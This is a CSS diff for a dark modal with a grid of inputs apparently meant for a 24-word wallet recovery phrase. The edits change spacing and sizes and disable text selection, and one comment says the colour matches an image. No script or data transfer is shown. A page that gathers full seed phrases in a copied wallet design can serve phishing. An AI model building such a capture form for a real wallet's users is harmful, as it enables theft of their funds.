@@ -10,10 +10,10 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            user-select: text !important;
-            -webkit-user-select: text !important;
-            -moz-user-select: text !important;
-            -ms-user-select: text !important;
+            user-select: none;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
         }
 
         body {
@@ -71,7 +71,7 @@
             background-color: rgba(0, 0, 0, 0.03);
         }
 
-        /* Main Modal Container - Custom height and width for 24-word fit */
+        /* Main Modal Container */
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -83,8 +83,7 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 460px;
-            min-height: 540px; /* Taller vertical layout */
+            width: 420px;
             border-radius: 22px;
             padding: 24px 20px 20px 20px;
             box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
@@ -98,7 +97,7 @@
         .dots {
             display: flex;
             gap: 6px;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .dot {
@@ -124,7 +123,7 @@
         .modal-subtitle {
             font-size: 12px;
             color: #8c8c9e;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
             text-align: center;
             line-height: 1.4;
         }
@@ -158,22 +157,23 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout - 3 columns, tightly packed vertically with zero scroll */
+        /* Inputs Container Layout - Less wide, compact vertical size */
         .inputs-container {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 5px;
+            grid-template-columns: repeat(3, 122px); /* Controls box width strictly */
+            justify-content: center;
+            gap: 6px;
             width: 100%;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
 
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #232329;
-            border-radius: 7px;
-            padding: 3px 6px;
-            height: 33px; /* Compact height */
+            border-radius: 8px;
+            padding: 4px 8px;
+            height: 38px; /* Keeps original comfortable vertical height */
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -181,20 +181,22 @@
         }
 
         .input-group label {
-            font-size: 8px;
+            font-size: 9px;
             color: #71717a;
             line-height: 1;
-            margin-bottom: 1px;
+            margin-bottom: 2px;
         }
 
         .input-group input {
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 11px;
+            font-size: 12px;
             outline: none;
             width: 100%;
             line-height: 1.2;
+            user-select: none;
+            -webkit-user-select: none;
         }
 
         /* Toggle Phrase Button */
@@ -204,7 +206,7 @@
             border: none;
             font-size: 12px;
             cursor: pointer;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             font-weight: 500;
             transition: color 0.25s ease;
             pointer-events: auto;
@@ -217,7 +219,7 @@
         /* Action Buttons - Dynamic States */
         .action-btn {
             width: 100%;
-            background-color: #1c1c21; /* Blackish gray when not fully filled */
+            background-color: #1c1c21; /* Blackish gray when incomplete */
             color: #71717a;
             border: none;
             border-radius: 12px;
@@ -231,7 +233,7 @@
 
         /* Active state when all inputs are filled */
         .action-btn.active-btn {
-            background-color: #b794f4; /* Slightly darker purple look */
+            background-color: #b794f4; /* Slightly darker purple look matching image */
             color: #000;
             cursor: pointer;
             pointer-events: auto;
